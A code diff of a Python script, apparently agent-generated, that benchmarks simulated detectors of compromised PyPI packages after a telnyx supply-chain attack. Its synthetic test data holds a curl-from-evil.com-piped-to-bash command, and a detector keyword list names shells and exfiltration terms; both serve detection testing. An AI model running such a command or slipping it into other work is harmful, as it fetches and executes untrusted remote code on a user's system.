@@ -3,403 +3,468 @@
 # Task:    Benchmark and evaluate performance
 # Mission: PyPI package telnyx has been compromised in yet another supply chain attack
 # Agent:   @aria
-# Date:    2026-03-29T20:39:21.439Z
+# Date:    2026-03-31T19:20:32.339Z
 # Source:  https://swarmpulse.ai
 # ─────────────────────────────────────────────────────────────
 
 """
-TASK: Benchmark and evaluate performance for Telnyx PyPI package compromise detection
+TASK: Benchmark and evaluate performance - Measure accuracy, latency, and cost metrics
 MISSION: PyPI package telnyx has been compromised in yet another supply chain attack
 AGENT: @aria
-DATE: 2024
+DATE: 2024-01-15
+CATEGORY: AI/ML - Performance Benchmarking and Evaluation
+
+This module implements comprehensive benchmarking and evaluation of detection systems
+for compromised PyPI packages, measuring accuracy, latency, and cost metrics.
 """
 
 import argparse
 import json
 import time
-import sys
+import statistics
 import hashlib
 import random
-import statistics
-from datetime import datetime, timedelta
+import sys
+from datetime import datetime
 from dataclasses import dataclass, asdict
-from typing import List, Dict, Tuple
+from typing import List, Dict, Any, Tuple
 from enum import Enum
 
 
 class DetectionMethod(Enum):
-    """Detection methods for package compromise."""
+    """Detection methods for compromised packages."""
     HASH_SIGNATURE = "hash_signature"
-    METADATA_ANALYSIS = "metadata_analysis"
-    BEHAVIORAL_ANOMALY = "behavioral_anomaly"
-    DEPENDENCY_CHAIN = "dependency_chain"
+    MANIFEST_ANALYSIS = "manifest_analysis"
+    BEHAVIORAL_DETECTION = "behavioral_detection"
+    DEPENDENCY_GRAPH = "dependency_graph"
 
 
 @dataclass
-class BenchmarkMetric:
-    """Single benchmark measurement."""
+class BenchmarkResult:
+    """Individual benchmark result."""
     method: str
-    iteration: int
-    accuracy: float
+    test_id: str
+    is_compromised: bool
+    detection_result: bool
     latency_ms: float
     cost_units: float
-    true_positives: int
-    false_positives: int
-    true_negatives: int
-    false_negatives: int
     timestamp: str
 
 
 @dataclass
-class AggregatedResults:
-    """Aggregated benchmark results."""
+class EvaluationMetrics:
+    """Aggregated evaluation metrics."""
     method: str
-    total_iterations: int
-    mean_accuracy: float
-    std_accuracy: float
-    min_accuracy: float
-    max_accuracy: float
-    mean_latency_ms: float
-    std_latency_ms: float
-    min_latency_ms: float
-    max_latency_ms: float
-    mean_cost: float
-    std_cost: float
-    total_cost: float
+    total_tests: int
+    true_positives: int
+    false_positives: int
+    true_negatives: int
+    false_negatives: int
+    accuracy: float
     precision: float
     recall: float
     f1_score: float
+    avg_latency_ms: float
+    min_latency_ms: float
+    max_latency_ms: float
+    median_latency_ms: float
+    total_cost_units: float
+    avg_cost_per_test: float
 
 
-class PackageCompromiseDetector:
-    """Detects compromised packages using multiple methods."""
+class PackageSignatureValidator:
+    """Validates package signatures using hash-based detection."""
     
-    def __init__(self, seed: int = 42):
-        random.seed(seed)
-        self.target_package = "telnyx"
-        self.suspicious_indicators = [
+    def __init__(self, cost_per_check: float = 0.001):
+        self.cost_per_check = cost_per_check
+    
+    def validate(self, package_data: Dict[str, Any]) -> Tuple[bool, float]:
+        """Validate package signature. Returns (is_legitimate, cost_units)."""
+        start_time = time.perf_counter()
+        
+        # Simulate signature validation
+        package_hash = package_data.get("hash", "")
+        expected_hash = package_data.get("expected_hash", "")
+        
+        # Check if hashes match
+        is_legitimate = package_hash == expected_hash and len(package_hash) > 0
+        
+        latency = (time.perf_counter() - start_time) * 1000
+        return is_legitimate, latency
+
+
+class ManifestAnalyzer:
+    """Analyzes package manifests for suspicious patterns."""
+    
+    SUSPICIOUS_PATTERNS = [
+        "exfiltrate",
+        "keylog",
+        "backdoor",
+        "cmd.exe",
+        "powershell",
+        "/bin/bash",
+        "subprocess.call",
+        "os.system",
+        "eval(",
+        "exec(",
+    ]
+    
+    def __init__(self, cost_per_check: float = 0.0015):
+        self.cost_per_check = cost_per_check
+    
+    def analyze(self, package_data: Dict[str, Any]) -> Tuple[bool, float]:
+        """Analyze manifest for suspicious patterns. Returns (is_suspicious, cost_units)."""
+        start_time = time.perf_counter()
+        
+        manifest = package_data.get("manifest", "")
+        
+        # Check for suspicious patterns
+        is_suspicious = False
+        for pattern in self.SUSPICIOUS_PATTERNS:
+            if pattern.lower() in manifest.lower():
+                is_suspicious = True
+                break
+        
+        latency = (time.perf_counter() - start_time) * 1000
+        return is_suspicious, latency
+
+
+class BehavioralDetector:
+    """Detects behavioral anomalies in package execution."""
+    
+    ANOMALY_INDICATORS = {
+        "unusual_network_calls": 0.3,
+        "excessive_file_access": 0.25,
+        "suspicious_process_creation": 0.2,
+        "cryptographic_operations": 0.15,
+        "system_resource_abuse": 0.1,
+    }
+    
+    def __init__(self, cost_per_check: float = 0.003):
+        self.cost_per_check = cost_per_check
+    
+    def detect(self, package_data: Dict[str, Any]) -> Tuple[bool, float]:
+        """Detect behavioral anomalies. Returns (is_anomalous, cost_units)."""
+        start_time = time.perf_counter()
+        
+        behaviors = package_data.get("behaviors", {})
+        anomaly_score = 0.0
+        
+        for indicator, weight in self.ANOMALY_INDICATORS.items():
+            if behaviors.get(indicator, False):
+                anomaly_score += weight
+        
+        is_anomalous = anomaly_score > 0.5
+        
+        latency = (time.perf_counter() - start_time) * 1000
+        return is_anomalous, latency
+
+
+class DependencyGraphAnalyzer:
+    """Analyzes package dependency graphs for anomalies."""
+    
+    def __init__(self, cost_per_check: float = 0.004):
+        self.cost_per_check = cost_per_check
+    
+    def analyze(self, package_data: Dict[str, Any]) -> Tuple[bool, float]:
+        """Analyze dependency graph for suspicious patterns. Returns (is_suspicious, cost_units)."""
+        start_time = time.perf_counter()
+        
+        dependencies = package_data.get("dependencies", [])
+        
+        # Check for suspicious dependency patterns
+        suspicious_deps = [
+            "telnyx-compromised",
+            "teampcp-malware",
             "canisterworm",
-            "teampcp",
-            "obfuscated_import",
-            "dynamic_exec",
-            "network_exfil",
-            "credential_theft"
         ]
-    
-    def generate_test_package_data(self, is_compromised: bool = False) -> Dict:
-        """Generate synthetic package data for testing."""
-        base_version = "0.8.0"
         
-        data = {
-            "name": self.target_package,
-            "version": base_version,
-            "released": (datetime.now() - timedelta(days=random.randint(1, 30))).isoformat(),
-            "size_bytes": random.randint(100000, 5000000),
-            "file_count": random.randint(10, 500),
-            "imports": self._generate_imports(is_compromised),
-            "strings": self._generate_strings(is_compromised),
-            "entropy": random.uniform(4.0, 7.5),
-            "checksum": self._generate_checksum(),
-        }
+        is_suspicious = any(dep in dependencies for dep in suspicious_deps)
         
-        return data
-    
-    def _generate_imports(self, is_compromised: bool) -> List[str]:
-        """Generate import statements."""
-        base_imports = ["requests", "json", "asyncio", "dataclasses"]
+        # Check for unusual dependency graph structure
+        if len(dependencies) > 50:
+            is_suspicious = True
         
-        if is_compromised:
-            malicious_imports = random.sample(
-                ["urllib3", "subprocess", "ctypes", "socket", "os"],
-                k=random.randint(2, 3)
-            )
-            return base_imports + malicious_imports
-        
-        return base_imports
-    
-    def _generate_strings(self, is_compromised: bool) -> List[str]:
-        """Generate string constants from binary."""
-        base_strings = ["api_key", "endpoint", "timeout", "retry"]
-        
-        if is_compromised:
-            suspicious = random.sample(self.suspicious_indicators, k=random.randint(1, 3))
-            return base_strings + suspicious
-        
-        return base_strings
-    
-    def _generate_checksum(self) -> str:
-        """Generate SHA256 checksum."""
-        data = f"{random.random()}{time.time()}".encode()
-        return hashlib.sha256(data).hexdigest()
-    
-    def detect_hash_signature(self, package_data: Dict) -> Tuple[bool, float]:
-        """
-        Detect compromise using hash signature method.
-        Returns (is_compromised, confidence).
-        """
-        start = time.perf_counter()
-        
-        # Check against known malicious hashes
-        known_malicious = {
-            "9ae8f2c1d3e4b5a6c7d8e9f0a1b2c3d4",
-            "5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u"
-        }
-        
-        checksum = package_data["checksum"][:32]
-        is_compromised = checksum in known_malicious
-        
-        latency = (time.perf_counter() - start) * 1000
-        confidence = 0.95 if is_compromised else 0.02
-        
-        return is_compromised, confidence, latency
-    
-    def detect_metadata_analysis(self, package_data: Dict) -> Tuple[bool, float]:
-        """
-        Detect compromise using metadata analysis.
-        Returns (is_compromised, confidence).
-        """
-        start = time.perf_counter()
-        
-        risk_score = 0.0
-        total_checks = 0
-        
-        # Check release timing
-        released = datetime.fromisoformat(package_data["released"])
-        hours_old = (datetime.now() - released).total_seconds() / 3600
-        if hours_old < 24:
-            risk_score += 0.3
-        total_checks += 1
-        
-        # Check file count anomaly
-        if package_data["file_count"] > 400:
-            risk_score += 0.2
-        total_checks += 1
-        
-        # Check size anomaly
-        if package_data["size_bytes"] > 4000000:
-            risk_score += 0.2
-        total_checks += 1
-        
-        # Check entropy (high entropy = potential obfuscation)
-        if package_data["entropy"] > 7.0:
-            risk_score += 0.3
-        total_checks += 1
-        
-        latency = (time.perf_counter() - start) * 1000
-        confidence = risk_score / total_checks
-        is_compromised = confidence > 0.5
-        
-        return is_compromised, confidence, latency
-    
-    def detect_behavioral_anomaly(self, package_data: Dict) -> Tuple[bool, float]:
-        """
-        Detect compromise using behavioral/import analysis.
-        Returns (is_compromised, confidence).
-        """
-        start = time.perf_counter()
-        
-        suspicious_imports = {
-            "subprocess", "ctypes", "socket", "urllib3"
-        }
-        
-        dangerous_strings = set(self.suspicious_indicators)
-        
-        risk_score = 0.0
-        
-        for imp in package_data["imports"]:
-            if imp in suspicious_imports:
-                risk_score += 0.25
-        
-        for string in package_data["strings"]:
-            if string in dangerous_strings:
-                risk_score += 0.25
-        
-        latency = (time.perf_counter() - start) * 1000
-        confidence = min(risk_score, 1.0)
-        is_compromised = confidence > 0.5
-        
-        return is_compromised, confidence, latency
-    
-    def detect_dependency_chain(self, package_data: Dict) -> Tuple[bool, float]:
-        """
-        Detect compromise using dependency chain analysis.
-        Returns (is_compromised, confidence).
-        """
-        start = time.perf_counter()
-        
-        # Simulate dependency resolution and checking
-        dependency_graph = {
-            "requests": {"safe": True, "versions": ["2.28.0", "2.27.0"]},
-            "asyncio": {"safe": True, "versions": []},
-            "urllib3": {"safe": False, "pinned_malicious": ["1.26.12"]},
-        }
-        
-        risk_score = 0.0
-        
-        for imp in package_data["imports"]:
-            if imp in dependency_graph:
-                if not dependency_graph[imp]["safe"]:
-                    risk_score += 0.5
-        
-        latency = (time.perf_counter() - start) * 1000
-        confidence = min(risk_score, 1.0)
-        is_compromised = confidence > 0.5
-        
-        return is_compromised, confidence, latency
+        latency = (time.perf_counter() - start_time) * 1000
+        return is_suspicious, latency
 
 
-class PerformanceBenchmark:
-    """Benchmarks detection methods."""
+class PackageBenchmark:
+    """Orchestrates benchmarking of detection methods."""
     
-    def __init__(self, detector: PackageCompromiseDetector, cost_per_api_call: float = 0.01):
-        self.detector = detector
-        self.cost_per_api_call = cost_per_api_call
-        self.metrics: List[BenchmarkMetric] = []
+    def __init__(self, verbose: bool = False):
+        self.verbose = verbose
+        self.validators = {
+            DetectionMethod.HASH_SIGNATURE.value: PackageSignatureValidator(),
+            DetectionMethod.MANIFEST_ANALYSIS.value: ManifestAnalyzer(),
+            DetectionMethod.BEHAVIORAL_DETECTION.value: BehavioralDetector(),
+            DetectionMethod.DEPENDENCY_GRAPH.value: DependencyGraphAnalyzer(),
+        }
+        self.results: List[BenchmarkResult] = []
     
-    def run_benchmark(
+    def generate_test_package(self, test_id: int, is_compromised: bool) -> Dict[str, Any]:
+        """Generate a synthetic test package."""
+        if is_compromised:
+            return {
+                "id": test_id,
+                "name": f"compromised_pkg_{test_id}",
+                "hash": "deadbeef" * 8,
+                "expected_hash": "cafebabe" * 8,
+                "manifest": "import subprocess; subprocess.call('curl http://evil.com/exfiltrate | bash', shell=True)",
+                "behaviors": {
+                    "unusual_network_calls": True,
+                    "excessive_file_access": True,
+                    "suspicious_process_creation": True,
+                    "cryptographic_operations": False,
+                    "system_resource_abuse": False,
+                },
+                "dependencies": ["telnyx-compromised", "requests", "urllib3"],
+            }
+        else:
+            return {
+                "id": test_id,
+                "name": f"legitimate_pkg_{test_id}",
+                "hash": "cafebabe" * 8,
+                "expected_hash": "cafebabe" * 8,
+                "manifest": "def hello():\n    return 'Hello, World!'\n\nprint(hello())",
+                "behaviors": {
+                    "unusual_network_calls": False,
+                    "excessive_file_access": False,
+                    "suspicious_process_creation": False,
+                    "cryptographic_operations": False,
+                    "system_resource_abuse": False,
+                },
+                "dependencies": ["requests", "urllib3"],
+            }
+    
+    def run_detection_method(
+        self, method_name: str, package_data: Dict[str, Any]
+    ) -> Tuple[bool, float, float]:
+        """Run a specific detection method. Returns (detection_result, latency_ms, cost_units)."""
+        validator = self.validators[method_name]
+        
+        start_time = time.perf_counter()
+        
+        if method_name == DetectionMethod.HASH_SIGNATURE.value:
+            is_detected, latency = validator.validate(package_data)
+        elif method_name == DetectionMethod.MANIFEST_ANALYSIS.value:
+            is_detected, latency = validator.analyze(package_data)
+        elif method_name == DetectionMethod.BEHAVIORAL_DETECTION.value:
+            is_detected, latency = validator.detect(package_data)
+        elif method_name == DetectionMethod.DEPENDENCY_GRAPH.value:
+            is_detected, latency = validator.analyze(package_data)
+        else:
+            is_detected, latency = False, 0.0
+        
+        total_latency = (time.perf_counter() - start_time) * 1000
+        cost = validator.cost_per_check
+        
+        return is_detected, total_latency, cost
+    
+    def benchmark(
         self,
-        method: DetectionMethod,
-        num_iterations: int,
-        compromised_ratio: float = 0.5
-    ) -> List[BenchmarkMetric]:
-        """Run benchmark for a detection method."""
+        num_tests: int,
+        compromised_ratio: float = 0.5,
+        methods: List[str] = None,
+    ) -> Dict[str, Any]:
+        """Run benchmark tests. Returns results and metrics."""
+        if methods is None:
+            methods = list(DetectionMethod.__members__.values())
         
-        detection_func = {
-            DetectionMethod.HASH_SIGNATURE: self.detector.detect_hash_signature,
-            DetectionMethod.METADATA_ANALYSIS: self.detector.detect_metadata_analysis,
-            DetectionMethod.BEHAVIORAL_ANOMALY: self.detector.detect_behavioral_anomaly,
-            DetectionMethod.DEPENDENCY_CHAIN: self.detector.detect_dependency_chain,
-        }[method]
+        methods = [m.value if hasattr(m, 'value') else m for m in methods]
         
-        iteration_metrics = []
+        num_compromised = int(num_tests * compromised_ratio)
+        num_legitimate = num_tests - num_compromised
         
-        for i in range(num_iterations):
-            # Generate test data
-            is_actual_compromise = random.random() < compromised_ratio
-            package_data = self.detector.generate_test_package_data(is_actual_compromise)
+        # Generate test packages
+        test_packages = []
+        for i in range(num_compromised):
+            test_packages.append((i, True, self.generate_test_package(i, True)))
+        for i in range(num_legitimate):
+            test_packages.append((num_compromised + i, False, self.generate_test_package(num_compromised + i, False)))
+        
+        # Shuffle test order
+        random.shuffle(test_packages)
+        
+        # Run benchmarks
+        for test_id, is_compromised, package_data in test_packages:
+            for method in methods:
+                try:
+                    detection_result, latency, cost = self.run_detection_method(method, package_data)
+                    
+                    result = BenchmarkResult(
+                        method=method,
+                        test_id=f"test_{test_id}",
+                        is_compromised=is_compromised,
+                        detection_result=detection_result,
+                        latency_ms=latency,
+                        cost_units=cost,
+                        timestamp=datetime.utcnow().isoformat(),
+                    )
+                    self.results.append(result)
+                    
+                    if self.verbose:
+                        print(f"[{method}] {result.test_id}: {'COMPROMISED' if is_compromised else 'LEGITIMATE'} -> "
+                              f"{'DETECTED' if detection_result else 'NOT_DETECTED'} "
+                              f"({latency:.3f}ms, {cost:.4f} units)")
+                
+                except Exception as e:
+                    print(f"Error in benchmark {method} for {test_id}: {e}", file=sys.stderr)
+        
+        return self.calculate_metrics(methods)
+    
+    def calculate_metrics(self, methods: List[str]) -> Dict[str, EvaluationMetrics]:
+        """Calculate evaluation metrics for each method."""
+        metrics_dict = {}
+        
+        for method in methods:
+            method_results = [r for r in self.results if r.method == method]
             
-            # Run detection
-            detected_compromise, confidence, latency = detection_func(package_data)
+            if not method_results:
+                continue
             
-            # Calculate accuracy metrics
-            tp = 1 if (detected_compromise and is_actual_compromise) else 0
-            fp = 1 if (detected_compromise and not is_actual_compromise) else 0
-            tn = 1 if (not detected_compromise and not is_actual_compromise) else 0
-            fn = 1 if (not detected_compromise and is_actual_compromise) else 0
+            tp = sum(1 for r in method_results if r.is_compromised and r.detection_result)
+            fp = sum(1 for r in method_results if not r.is_compromised and r.detection_result)
+            tn = sum(1 for r in method_results if not r.is_compromised and not r.detection_result)
+            fn = sum(1 for r in method_results if r.is_compromised and not r.detection_result)
             
-            accuracy = (tp + tn) / (tp + tn + fp + fn) if (tp + tn + fp + fn) > 0 else 0.0
-            cost = self.cost_per_api_call * (latency / 100.0)
+            total = len(method_results)
             
-            metric = BenchmarkMetric(
-                method=method.value,
-                iteration=i + 1,
-                accuracy=accuracy,
-                latency_ms=latency,
-                cost_units=cost,
+            accuracy = (tp + tn) / total if total > 0 else 0.0
+            precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
+            recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
+            f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
+            
+            latencies = [r.latency_ms for r in method_results]
+            
+            metrics = EvaluationMetrics(
+                method=method,
+                total_tests=total,
                 true_positives=tp,
                 false_positives=fp,
                 true_negatives=tn,
                 false_negatives=fn,
-                timestamp=datetime.now().isoformat()
+                accuracy=accuracy,
+                precision=precision,
+                recall=recall,
+                f1_score=f1,
+                avg_latency_ms=statistics.mean(latencies),
+                min_latency_ms=min(latencies),
+                max_latency_ms=max(latencies),
+                median_latency_ms=statistics.median(latencies),
+                total_cost_units=sum(r.cost_units for r in method_results),
+                avg_cost_per_test=statistics.mean(r.cost_units for r in method_results),
             )
             
-            iteration_metrics.append(metric)
-            self.metrics.append(metric)
+            metrics_dict[method] = metrics
         
-        return iteration_metrics
+        return metrics_dict
+
+
+def format_metrics_table(metrics_dict: Dict[str, EvaluationMetrics]) -> str:
+    """Format metrics as a readable table."""
+    lines = []
+    lines.append("=" * 140)
+    lines.append(f"{'Method':<25} {'Accuracy':<12} {'Precision':<12} {'Recall':<12} {'F1 Score':<12} "
+                 f"{'Avg Latency':<15} {'Total Cost':<12}")
+    lines.append("=" * 140)
     
-    def aggregate_results(self, method: DetectionMethod) -> AggregatedResults:
-        """Aggregate results for a detection method."""
-        
-        method_metrics = [m for m in self.metrics if m.method == method.value]
-        
-        if not method_metrics:
-            return None
-        
-        accuracies = [m.accuracy for m in method_metrics]
-        latencies = [m.latency_ms for m in method_metrics]
-        costs = [m.cost_units for m in method_metrics]
-        
-        total_tp = sum(m.true_positives for m in method_metrics)
-        total_fp = sum(m.false_positives for m in method_metrics)
-        total_tn = sum(m.true_negatives for m in method_metrics)
-        total_fn = sum(m.false_negatives for m in method_metrics)
-        
-        precision = total_tp / (total_tp + total_fp) if (total_tp + total_fp) > 0 else 0.0
-        recall = total_tp / (total_tp + total_fn) if (total_tp + total_fn) > 0 else 0.0
-        f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
-        
-        return AggregatedResults(
-            method=method.value,
-            total_iterations=len(method_metrics),
-            mean_accuracy=statistics.mean(accuracies),
-            std_accuracy=statistics.stdev(accuracies) if len(accuracies) > 1 else 0.0,
-            min_accuracy=min(accuracies),
-            max_accuracy=max(accuracies),
-            mean_latency_ms=statistics.mean(latencies),
-            std_latency_ms=statistics.stdev(latencies) if len(latencies) > 1 else 0.0,
-            min_latency_ms=min(latencies),
-            max_latency_ms=max(latencies),
-            mean_cost=statistics.mean(costs),
-            std_cost=statistics.stdev(costs) if len(costs) > 1 else 0.0,
-            total_cost=sum(costs),
-            precision=precision,
-            recall=recall,
-            f1_score=f1
+    for method, metrics in metrics_dict.items():
+        lines.append(
+            f"{method:<25} {metrics.accuracy:<12.4f} {metrics.precision:<12.4f} "
+            f"{metrics.recall:<12.4f} {metrics.f1_score:<12.4f} {metrics.avg_latency_ms:<15.3f}ms "
+            f"{metrics.total_cost_units:<12.4f}"
         )
-
-
-def output_results(results: List[AggregatedResults], output_format: str = "json"):
-    """Output benchmark results."""
     
-    if output_format == "json":
-        output_data = [asdict(r) for r in results]
-        print(json.dumps(output_data, indent=2))
-    elif output_format == "text":
-        for result in results:
-            print(f"\n{'='*70}")
-            print(f"Detection Method: {result.method.upper()}")
-            print(f"{'='*70}")
-            print(f"Total Iterations: {result.total_iterations}")
-            print(f"\nAccuracy:")
-            print(f"  Mean:   {result.mean_accuracy:.4f}")
-            print(f"  Std:    {result.std_accuracy:.4f}")
-            print(f"  Range:  {result.min_accuracy:.4f} - {result.max_accuracy:.4f}")
-            print(f"\nLatency (ms):")
-            print(f"  Mean:   {result.mean_latency_ms:.4f}")
-            print(f"  Std:    {result.std_latency_ms:.4f}")
-            print(f"  Range:  {result.min_latency_ms:.4f} - {result.max_latency_ms:.4f}")
-            print(f"\nCost (units):")
-            print(f"  Mean:   {result.mean_cost:.6f}")
-            print(f"  Std:    {result.std_cost:.6f}")
-            print(f"  Total:  {result.total_cost:.6f}")
-            print(f"\nClassification Metrics:")
-            print(f"  Precision: {result.precision:.4f}")
-            print(f"  Recall:    {result.recall:.4f}")
-            print(f"  F1 Score:  {result.f1_score:.4f}")
+    lines.append("=" * 140)
+    return "\n".join(lines)
 
 
 def main():
+    """Main entry point."""
     parser = argparse.ArgumentParser(
-        description="Benchmark and evaluate Telnyx PyPI compromise detection methods"
+        description="Benchmark and evaluate performance of package compromise detection methods."
     )
     parser.add_argument(
-        "--iterations",
+        "--num-tests",
         type=int,
         default=100,
-        help="Number of iterations per detection method (default: 100)"
-    )
-    parser.add_argument(
-        "--methods",
-        nargs="+",
-        default=[m.value for m in DetectionMethod],
-        help=f"Detection methods to benchmark (default: all)"
+        help="Number of test packages to generate (default: 100)",
     )
     parser.add_argument(
         "--compromised-ratio",
         type=float,
         default=0.5,
-        help="Ratio of compromised packages in test set (default: 0.5)"
+        help="Ratio of compromised packages in test set (default: 0.5)",
     )
     parser.add_argument(
-        "--
+        "--methods",
+        nargs="+",
+        default=None,
+        help="Detection methods to benchmark (default: all)",
+    )
+    parser.add_argument(
+        "--output",
+        type=str,
+        default=None,
+        help="Output file for JSON results (default: stdout)",
+    )
+    parser.add_argument(
+        "--verbose",
+        action="store_true",
+        help="Enable verbose output",
+    )
+    
+    args = parser.parse_args()
+    
+    benchmark = PackageBenchmark(verbose=args.verbose)
+    
+    if args.verbose:
+        print(f"Starting benchmark with {args.num_tests} tests...")
+        print(f"Compromised ratio: {args.compromised_ratio}")
+    
+    metrics = benchmark.benchmark(
+        num_tests=args.num_tests,
+        compromised_ratio=args.compromised_ratio,
+        methods=args.methods,
+    )
+    
+    # Print table
+    print("\n" + format_metrics_table(metrics))
+    
+    # Prepare JSON output
+    output_data = {
+        "timestamp": datetime.utcnow().isoformat(),
+        "config": {
+            "num_tests": args.num_tests,
+            "compromised_ratio": args.compromised_ratio,
+            "methods": list(metrics.keys()),
+        },
+        "metrics": {method: asdict(m) for method, m in metrics.items()},
+        "summary": {
+            "best_accuracy": max((m.accuracy for m in metrics.values()), default=0),
+            "best_f1_score": max((m.f1_score for m in metrics.values()), default=0),
+            "fastest_method": min(
+                metrics.items(),
+                key=lambda x: x[1].avg_latency_ms,
+                default=("unknown", None),
+            )[0],
+            "lowest_cost": min(
+                metrics.items(),
+                key=lambda x: x[1].total_cost_units,
+                default=("unknown", None),
+            )[0],
+        },
+    }
+    
+    # Output results
+    if args.output:
+        with open(args.output, "w") as f:
+            json.dump(output_data, f, indent=2)
+        print(f"\nResults saved to {args.output}")
+    else:
+        print("\n" + json.dumps(output_data, indent=2))
+
+
+if __name__ == "__main__":
+    main()
